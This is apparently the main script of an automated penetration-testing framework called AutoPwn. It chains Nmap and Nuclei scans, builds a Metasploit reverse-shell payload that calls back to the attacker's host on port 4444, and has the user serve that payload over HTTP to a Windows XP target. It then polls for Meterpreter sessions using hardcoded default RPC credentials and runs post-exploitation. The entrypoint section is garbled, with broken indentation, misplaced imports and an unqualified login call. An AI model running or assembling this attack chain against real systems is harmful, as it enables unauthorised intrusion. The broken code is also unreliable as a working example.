import os
import time
import argparse
from modules import auth
from modules import rbac
from modules.scanner import nmap_scan
from modules.vuln_assessment import nuclei_scan
from modules.exploit import metasploit_exploit, post_exploit
from modules.report_generator import markdown_report
from pymetasploit3.msfrpc import MsfRpcClient


def autopwn(target, lhost):
    print(f"\n🚀 Starting AutoPwn sequence on {target}\n")

    os.makedirs("results", exist_ok=True)
    os.makedirs("payloads", exist_ok=True)
    os.makedirs("reports", exist_ok=True)

    # === Phase 1: Nmap Scan ===
    try:
        print("[+] Running Nmap scan...")
        open_ports, http_services = nmap_scan.run_nmap_scan(target)
        ports_str = ", ".join(open_ports) if open_ports else "None"
        with open("results/nmap_scan.txt", "w") as f:
            f.write(f"Nmap Scan for {target}\nOpen Ports: {ports_str}\n")
    except Exception as e:
        print(f"[-] Nmap scan failed: {e}")
        return

    if not open_ports:
        print("[-] No open ports found. Exiting.")
        return

    # === Phase 2: Nuclei Scan ===
    nuclei_output = ""
    try:
        if http_services:
            print("[+] Running Nuclei scan...")
            nuclei_scan.run_nuclei_scan(target)
            with open("results/nuclei_output.txt") as f:
                nuclei_output = f.read()
        else:
            nuclei_output = "No HTTP services found. Skipped Nuclei.\n"
            with open("results/nuclei_output.txt", "w") as f:
                f.write(nuclei_output)
    except Exception as e:
        nuclei_output = f"Nuclei scan failed: {e}\n"
        with open("results/nuclei_output.txt", "w") as f:
            f.write(nuclei_output)

     # === Phase 3: Exploitation (Payload + Listener) ===
    print("[+] Generating payload and starting Metasploit listener...")

    payload_path = metasploit_exploit.build_payload(lhost, 4444)
    if not payload_path:
        print("[-] Payload generation failed.")
        return

    listener_log = "[*] Skipped automatic RPC listener. Use manual handler."

    with open("results/msf_output.txt", "w") as f:
        f.write(listener_log)

    print(f"[+] Payload saved to: {payload_path}")
    print(f"[!] Start HTTP server manually: cd payloads && python3 -m http.server 8000")
    print(f"[!] Then run the payload on the target Windows XP machine.")
    input("📦 Press ENTER after delivering the payload on the target...\n")

    # === Wait for Session Detection ===
    print("[+] Waiting up to 60 seconds for reverse shell connection...")

    session_id = None
    for i in range(60):
        try:
            client = MsfRpcClient(username='msf', password='msf', port=55553, ssl=False)
            sessions = client.sessions.list
            if sessions:
                session_id = list(sessions.keys())[0]
                print(f"[+] Session {session_id} opened after {i+1} seconds!")
                break
        except:
            pass
        time.sleep(1)

    if not session_id:
        post_notes = "[-] No active Meterpreter sessions found. Post-exploitation aborted."
        print(post_notes)
    else:
        print(f"[+] Running post-exploitation for session {session_id}...")
        post_notes = post_exploit.run_post_exploitation(session_id=session_id)

    with open("results/post_exploit.txt", "w") as f:
        f.write(post_notes)

    # === Phase 5: Report Generation ===
    print("[+] Generating report...")
    with open("results/nmap_scan.txt") as f:
        nmap_data = f.read()
    with open("results/msf_output.txt") as f:
        msf_data = f.read()
    with open("results/post_exploit.txt") as f:
        post_data = f.read()

    markdown_report.generate_report(
        target_ip=target,
        nmap_output=nmap_data,
        nuclei_output=nuclei_output,
        msf_results=msf_data,
        post_exploit_notes=post_data
    )

    print("🎯 AutoPwn complete! Report saved to: reports/attack_report.md")


# === Main Entrypoint ===
if __name__ == "__main__":
    username, role = auth.login()
from modules.logger import log_action
from modules.rbac import show_rbac_menu
from modules.consent import check_consent

check_consent()
username, role = login()
log_action(username, "Logged in")

choice = show_rbac_menu(username, role)
# You can route actions based on choice and role here.


    if not rbac.is_allowed(role, "autopwn"):
        print("[-] You do not have permission to run the autopwn module.")
        exit(1)

    parser = argparse.ArgumentParser(description="AutoPwn Framework")
parser.add_argument("--target", required=True, help="Target IP address")
parser.add_argument("--lhost", required=True, help="Your Kali IP (for reverse shell)")
args = parser.parse_args()

autopwn(args.target, args.lhost)

